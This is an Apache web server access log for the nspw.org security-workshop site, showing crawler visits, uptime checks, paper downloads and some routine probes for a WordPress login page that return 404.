154.120.242.82 - - [25/Apr/2018:10:02:30 -0400] "GET /papers/2008/nspw2008-beautement.pdf HTTP/1.1" 206 25680 "https://www.google.co.zw/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
154.120.242.82 - - [25/Apr/2018:10:02:18 -0400] "GET /papers/2008/nspw2008-beautement.pdf HTTP/1.1" 206 114311 "https://www.google.co.zw/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
154.120.242.82 - - [25/Apr/2018:10:02:35 -0400] "GET /papers/2008/nspw2008-beautement.pdf HTTP/1.1" 206 14665 "https://www.google.co.zw/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
154.120.242.82 - - [25/Apr/2018:10:02:05 -0400] "GET /papers/2008/nspw2008-beautement.pdf HTTP/1.1" 200 578359 "https://www.google.co.zw/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
88.230.169.15 - - [25/Apr/2018:10:03:17 -0400] "GET /wp-login.php HTTP/1.1" 404 7985 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
88.230.169.15 - - [25/Apr/2018:10:03:18 -0400] "GET / HTTP/1.1" 200 8206 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
69.162.124.227 - - [25/Apr/2018:10:04:42 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
66.249.73.87 - - [25/Apr/2018:10:06:26 -0400] "GET /papers/2001/nspw2001-yan.pdf HTTP/1.1" 200 510133 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.87 - - [25/Apr/2018:10:06:28 -0400] "GET /proceedings/2001 HTTP/1.1" 200 2735 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.89 - - [25/Apr/2018:10:07:54 -0400] "GET /papers/2005/nspw2005-mchugh.pdf HTTP/1.1" 200 517652 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.91 - - [25/Apr/2018:10:07:54 -0400] "GET /papers/2005/nspw2005-mchugh.pdf HTTP/1.1" 200 517652 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
93.170.217.233 - - [25/Apr/2018:10:08:38 -0400] "GET /wp-login.php HTTP/1.1" 404 7839 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
93.170.217.233 - - [25/Apr/2018:10:08:39 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
184.94.240.92 - - [25/Apr/2018:10:08:47 -0400] "GET / HTTP/1.1" 200 11660 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0"
69.162.124.227 - - [25/Apr/2018:10:09:42 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
208.80.194.28 - - [25/Apr/2018:10:10:55 -0400] "GET / HTTP/1.0" 200 11644 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.11) Gecko/20101013 Ubuntu/10.04 (lucid) Firefox/3.6.11"
66.249.73.87 - - [25/Apr/2018:10:11:35 -0400] "GET /papers/2004/nspw2004-backmatter.pdf HTTP/1.1" 200 16316 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.89 - - [25/Apr/2018:10:11:36 -0400] "GET /papers/2005/nspw2005-schwarting.pdf HTTP/1.1" 200 692999 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
69.162.124.227 - - [25/Apr/2018:10:14:42 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
125.201.0.10 - - [25/Apr/2018:10:16:41 -0400] "GET /wp-login.php HTTP/1.1" 404 8034 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
125.201.0.10 - - [25/Apr/2018:10:16:42 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
66.249.73.91 - - [25/Apr/2018:10:16:45 -0400] "GET /2004/submission.content HTTP/1.1" 200 3911 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.89 - - [25/Apr/2018:10:16:45 -0400] "GET /2007/cfp.shtml HTTP/1.1" 200 8391 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
14.152.59.226 - - [25/Apr/2018:10:17:56 -0400] "GET /2013 HTTP/1.1" 200 12852 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0"
40.77.167.107 - - [25/Apr/2018:10:17:54 -0400] "GET /2009/proceedings/2013/nspw2013-bishop.pdf HTTP/1.1" 200 510219 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
14.152.59.226 - - [25/Apr/2018:10:18:43 -0400] "GET /2012 HTTP/1.1" 200 13223 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0"
86.126.202.67 - - [25/Apr/2018:10:19:31 -0400] "GET /wp-login.php HTTP/1.1" 404 7839 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
86.126.202.67 - - [25/Apr/2018:10:19:32 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
208.80.194.29 - - [25/Apr/2018:10:19:33 -0400] "GET / HTTP/1.0" 200 11644 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13"
207.46.13.114 - - [25/Apr/2018:10:19:26 -0400] "GET /papers/1994/nspw1994-lincoln.pdf HTTP/1.1" 200 353869 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
69.162.124.227 - - [25/Apr/2018:10:19:42 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
194.187.170.155 - - [25/Apr/2018:10:20:10 -0400] "GET /robots.txt HTTP/1.1" 200 4030 "-" "Mozilla/5.0 (compatible; Qwantify/2.4w; +https://www.qwant.com/)/2.4w"
194.187.170.155 - - [25/Apr/2018:10:20:11 -0400] "GET /robots.txt HTTP/1.1" 200 4030 "-" "Mozilla/5.0 (compatible; Qwantify/2.4w; +https://www.qwant.com/)/2.4w"
194.187.170.155 - - [25/Apr/2018:10:20:11 -0400] "GET /2018 HTTP/1.1" 200 6488 "-" "Mozilla/5.0 (compatible; Qwantify/2.4w; +https://www.qwant.com/)/2.4w"
194.187.170.155 - - [25/Apr/2018:10:20:47 -0400] "GET / HTTP/1.1" 200 6200 "-" "Mozilla/5.0 (compatible; Qwantify/2.4w; +https://www.qwant.com/)/2.4w"
66.249.73.89 - - [25/Apr/2018:10:21:47 -0400] "GET /papers/1994/nspw1994-limoges.pdf HTTP/1.1" 200 983974 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.87 - - [25/Apr/2018:10:21:48 -0400] "GET /2009/proceedings/1996/ HTTP/1.1" 403 3949 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
5.255.250.67 - - [25/Apr/2018:10:20:30 -0400] "GET /papers/1996/nspw1996-de_capitani_di_vimercati.pdf HTTP/1.1" 200 1458601 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
216.244.66.236 - - [25/Apr/2018:10:23:22 -0400] "GET /robots.txt HTTP/1.1" 200 5796 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
69.162.124.227 - - [25/Apr/2018:10:24:42 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
59.88.247.228 - - [25/Apr/2018:10:24:58 -0400] "GET /wp-login.php HTTP/1.1" 404 7839 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
59.88.247.228 - - [25/Apr/2018:10:24:59 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
66.249.73.91 - - [25/Apr/2018:10:26:57 -0400] "GET /papers/2010/nspw2010-maxion.pdf HTTP/1.1" 200 409311 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.89 - - [25/Apr/2018:10:27:03 -0400] "GET /papers/2007/nspw2007-hunker.pdf HTTP/1.1" 200 284521 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
184.105.139.68 - - [25/Apr/2018:10:28:07 -0400] "GET / HTTP/1.1" 200 11408 "-" "-"
69.162.124.227 - - [25/Apr/2018:10:29:42 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
54.70.40.11 - - [25/Apr/2018:10:30:15 -0400] "GET /papers/1996/nspw1996-baker.pdf HTTP/1.1" 200 482731 "-" "Mozilla/5.0 (compatible) SemanticScholarBot (+https://www.semanticscholar.org/crawler)"
208.163.53.30 - - [25/Apr/2018:10:30:32 -0400] "GET /favicon.ico HTTP/1.1" 404 4109 "https://www.nspw.org/papers/1999/nspw1999-henning.pdf" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
208.163.53.30 - - [25/Apr/2018:10:30:32 -0400] "GET /papers/1999/nspw1999-henning.pdf HTTP/1.1" 200 666945 "https://www.google.com.jm/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
54.70.40.11 - - [25/Apr/2018:10:30:39 -0400] "GET /papers/1997/nspw1997-meadows.pdf HTTP/1.1" 200 431723 "-" "Mozilla/5.0 (compatible) SemanticScholarBot (+https://www.semanticscholar.org/crawler)"
154.120.242.82 - - [25/Apr/2018:10:31:02 -0400] "GET /papers/2008/nspw2008-beautement.pdf HTTP/1.1" 206 49160 "http://www.nspw.org/papers/2008/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
66.249.73.89 - - [25/Apr/2018:10:31:23 -0400] "GET /cfp/nspw2012-cfp.pdf HTTP/1.1" 200 51448 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
154.120.242.82 - - [25/Apr/2018:10:31:21 -0400] "GET /papers/2008/nspw2008-beautement.pdf HTTP/1.1" 206 195542 "http://www.nspw.org/papers/2008/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
154.120.242.82 - - [25/Apr/2018:10:31:19 -0400] "GET /papers/2008/nspw2008-beautement.pdf HTTP/1.1" 206 111587 "http://www.nspw.org/papers/2008/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
154.120.242.82 - - [25/Apr/2018:10:31:25 -0400] "GET /papers/2008/nspw2008-beautement.pdf HTTP/1.1" 206 69950 "http://www.nspw.org/papers/2008/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
154.120.242.82 - - [25/Apr/2018:10:31:22 -0400] "GET /papers/2008/nspw2008-beautement.pdf HTTP/1.1" 206 47831 "http://www.nspw.org/papers/2008/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
154.120.242.82 - - [25/Apr/2018:10:31:52 -0400] "GET /papers/2008/nspw2008-beautement.pdf HTTP/1.1" 206 59508 "http://www.nspw.org/papers/2008/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
154.120.242.82 - - [25/Apr/2018:10:32:09 -0400] "GET /papers/2008/nspw2008-beautement.pdf HTTP/1.1" 206 43680 "http://www.nspw.org/papers/2008/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
154.120.242.82 - - [25/Apr/2018:10:32:13 -0400] "GET /papers/2008/nspw2008-beautement.pdf HTTP/1.1" 206 51479 "http://www.nspw.org/papers/2008/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
154.120.242.82 - - [25/Apr/2018:10:31:35 -0400] "GET /papers/2008/nspw2008-beautement.pdf HTTP/1.1" 206 69950 "http://www.nspw.org/papers/2008/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
154.120.242.82 - - [25/Apr/2018:10:31:54 -0400] "GET /papers/2008/nspw2008-beautement.pdf HTTP/1.1" 206 71336 "http://www.nspw.org/papers/2008/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
154.120.242.82 - - [25/Apr/2018:10:32:02 -0400] "GET /papers/2008/nspw2008-beautement.pdf HTTP/1.1" 206 72722 "http://www.nspw.org/papers/2008/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
123.125.143.7 - - [25/Apr/2018:10:32:27 -0400] "GET /modules/system/system.base.css?p7kfx6 HTTP/1.1" 200 9624 "-" "Python-urllib/2.7"
123.125.143.28 - - [25/Apr/2018:10:32:28 -0400] "GET /modules/comment/comment.css?p7kfx6 HTTP/1.1" 200 4339 "-" "Python-urllib/2.7"
123.125.143.7 - - [25/Apr/2018:10:32:29 -0400] "GET /themes/garland/style.css?p7kfx6 HTTP/1.1" 200 25021 "-" "Python-urllib/2.7"
154.120.242.82 - - [25/Apr/2018:10:32:30 -0400] "GET /papers/2008/nspw2008-beautement.pdf HTTP/1.1" 206 27622 "http://www.nspw.org/papers/2008/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
123.125.143.12 - - [25/Apr/2018:10:32:32 -0400] "GET /themes/garland/print.css?p7kfx6 HTTP/1.1" 200 5203 "-" "Python-urllib/2.7"
123.125.143.5 - - [25/Apr/2018:10:32:34 -0400] "GET /sites/default/files/nspw-logo-smaller.jpg HTTP/1.1" 200 6165 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0"
123.125.143.5 - - [25/Apr/2018:10:32:35 -0400] "GET /themes/garland/images/bg-navigation-item-hover.png HTTP/1.1" 200 709 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0"
154.120.242.82 - - [25/Apr/2018:10:31:42 -0400] "GET /papers/2008/nspw2008-beautement.pdf HTTP/1.1" 206 43672 "http://www.nspw.org/papers/2008/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
154.120.242.82 - - [25/Apr/2018:10:32:35 -0400] "GET /papers/2008/nspw2008-beautement.pdf HTTP/1.1" 206 67537 "http://www.nspw.org/papers/2008/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
123.125.143.5 - - [25/Apr/2018:10:32:36 -0400] "GET /themes/garland/images/bg-navigation-item.png HTTP/1.1" 200 757 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0"
123.125.143.5 - - [25/Apr/2018:10:32:38 -0400] "GET /themes/garland/images/menu-leaf.gif HTTP/1.1" 200 437 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0"
154.120.242.82 - - [25/Apr/2018:10:32:38 -0400] "GET /papers/2008/nspw2008-beautement.pdf HTTP/1.1" 206 35421 "http://www.nspw.org/papers/2008/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
123.125.143.5 - - [25/Apr/2018:10:32:39 -0400] "GET /themes/garland/images/menu-expanded.gif HTTP/1.1" 200 437 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0"
123.125.143.5 - - [25/Apr/2018:10:32:41 -0400] "GET /themes/garland/images/menu-collapsed.gif HTTP/1.1" 200 437 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0"
154.120.242.82 - - [25/Apr/2018:10:32:31 -0400] "GET /papers/2008/nspw2008-beautement.pdf HTTP/1.1" 206 67535 "http://www.nspw.org/papers/2008/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
154.120.242.82 - - [25/Apr/2018:10:32:41 -0400] "GET /papers/2008/nspw2008-beautement.pdf HTTP/1.1" 206 19593 "http://www.nspw.org/papers/2008/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
154.120.242.82 - - [25/Apr/2018:10:32:37 -0400] "GET /papers/2008/nspw2008-beautement.pdf HTTP/1.1" 206 47830 "http://www.nspw.org/papers/2008/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
154.120.242.82 - - [25/Apr/2018:10:32:34 -0400] "GET /papers/2008/nspw2008-beautement.pdf HTTP/1.1" 206 66649 "http://www.nspw.org/papers/2008/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
154.120.242.82 - - [25/Apr/2018:10:32:55 -0400] "GET /papers/2008/nspw2008-beautement.pdf HTTP/1.1" 206 51479 "http://www.nspw.org/papers/2008/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
154.120.242.82 - - [25/Apr/2018:10:32:58 -0400] "GET /papers/2008/nspw2008-beautement.pdf HTTP/1.1" 206 51477 "http://www.nspw.org/papers/2008/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
154.120.242.82 - - [25/Apr/2018:10:33:03 -0400] "GET /papers/2008/nspw2008-beautement.pdf HTTP/1.1" 206 27392 "http://www.nspw.org/papers/2008/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
154.120.242.82 - - [25/Apr/2018:10:33:10 -0400] "GET /papers/2008/nspw2008-beautement.pdf HTTP/1.1" 206 50236 "http://www.nspw.org/papers/2008/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
154.120.242.82 - - [25/Apr/2018:10:33:12 -0400] "GET /papers/2008/nspw2008-beautement.pdf HTTP/1.1" 206 51711 "http://www.nspw.org/papers/2008/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
154.120.242.82 - - [25/Apr/2018:10:33:15 -0400] "GET /papers/2008/nspw2008-beautement.pdf HTTP/1.1" 206 35422 "http://www.nspw.org/papers/2008/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
154.120.242.82 - - [25/Apr/2018:10:33:16 -0400] "GET /papers/2008/nspw2008-beautement.pdf HTTP/1.1" 206 43450 "http://www.nspw.org/papers/2008/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
154.120.242.82 - - [25/Apr/2018:10:33:13 -0400] "GET /papers/2008/nspw2008-beautement.pdf HTTP/1.1" 206 51711 "http://www.nspw.org/papers/2008/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
154.120.242.82 - - [25/Apr/2018:10:33:21 -0400] "GET /papers/2008/nspw2008-beautement.pdf HTTP/1.1" 206 19363 "http://www.nspw.org/papers/2008/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
154.120.242.82 - - [25/Apr/2018:10:32:29 -0400] "GET /papers/2008/nspw2008-beautement.pdf HTTP/1.1" 206 43672 "http://www.nspw.org/papers/2008/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
154.120.242.82 - - [25/Apr/2018:10:33:27 -0400] "GET /papers/2008/nspw2008-beautement.pdf HTTP/1.1" 206 51708 "http://www.nspw.org/papers/2008/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
154.120.242.82 - - [25/Apr/2018:10:33:41 -0400] "GET /papers/2008/nspw2008-beautement.pdf HTTP/1.1" 206 33823 "http://www.nspw.org/papers/2008/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
154.120.242.82 - - [25/Apr/2018:10:33:41 -0400] "GET /papers/2008/nspw2008-beautement.pdf HTTP/1.1" 206 19593 "http://www.nspw.org/papers/2008/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
154.120.242.82 - - [25/Apr/2018:10:33:41 -0400] "GET /papers/2008/nspw2008-beautement.pdf HTTP/1.1" 206 11565 "http://www.nspw.org/papers/2008/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
69.162.124.227 - - [25/Apr/2018:10:34:41 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
187.208.214.177 - - [25/Apr/2018:10:35:13 -0400] "GET /wp-login.php HTTP/1.1" 404 7985 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
187.208.214.177 - - [25/Apr/2018:10:35:14 -0400] "GET / HTTP/1.1" 200 8206 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
154.120.242.82 - - [25/Apr/2018:10:31:23 -0400] "GET /papers/2008/nspw2008-beautement.pdf HTTP/1.1" 206 47829 "http://www.nspw.org/papers/2008/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
154.120.242.82 - - [25/Apr/2018:10:31:33 -0400] "GET /papers/2008/nspw2008-beautement.pdf HTTP/1.1" 206 69950 "http://www.nspw.org/papers/2008/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
154.120.242.82 - - [25/Apr/2018:10:31:25 -0400] "GET /papers/2008/nspw2008-beautement.pdf HTTP/1.1" 206 68620 "http://www.nspw.org/papers/2008/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
154.120.242.82 - - [25/Apr/2018:10:32:03 -0400] "GET /papers/2008/nspw2008-beautement.pdf HTTP/1.1" 206 69950 "http://www.nspw.org/papers/2008/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
154.120.242.82 - - [25/Apr/2018:10:32:20 -0400] "GET /papers/2008/nspw2008-beautement.pdf HTTP/1.1" 206 69950 "http://www.nspw.org/papers/2008/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
69.162.124.227 - - [25/Apr/2018:10:39:41 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
66.249.73.89 - - [25/Apr/2018:10:41:14 -0400] "GET /2009/proceedings/1993/nspw1993-dobson.pdf HTTP/1.1" 200 1283187 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
1.212.189.109 - - [25/Apr/2018:10:42:18 -0400] "GET /wp-login.php HTTP/1.1" 404 7985 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
1.212.189.109 - - [25/Apr/2018:10:42:19 -0400] "GET / HTTP/1.1" 200 8206 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
81.96.56.96 - - [25/Apr/2018:10:43:05 -0400] "GET /wp-login.php HTTP/1.1" 404 7985 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
81.96.56.96 - - [25/Apr/2018:10:43:06 -0400] "GET / HTTP/1.1" 200 8206 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
180.76.15.25 - - [25/Apr/2018:10:43:15 -0400] "GET /modules/system/system.theme.css?nhfa6e HTTP/1.1" 200 7443 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
69.162.124.227 - - [25/Apr/2018:10:44:41 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
66.249.73.87 - - [25/Apr/2018:10:46:10 -0400] "GET /2008/invite/reg.html HTTP/1.1" 200 6857 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.89 - - [25/Apr/2018:10:48:04 -0400] "GET /current/index.shtml HTTP/1.1" 404 8012 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
168.167.4.2 - - [25/Apr/2018:10:48:47 -0400] "GET /papers/2003/nspw2003-jones.pdf HTTP/1.1" 200 722952 "https://www.google.co.bw/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36"
168.167.4.2 - - [25/Apr/2018:10:48:52 -0400] "GET /favicon.ico HTTP/1.1" 404 692 "https://www.nspw.org/papers/2003/nspw2003-jones.pdf" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36"
69.162.124.227 - - [25/Apr/2018:10:49:41 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
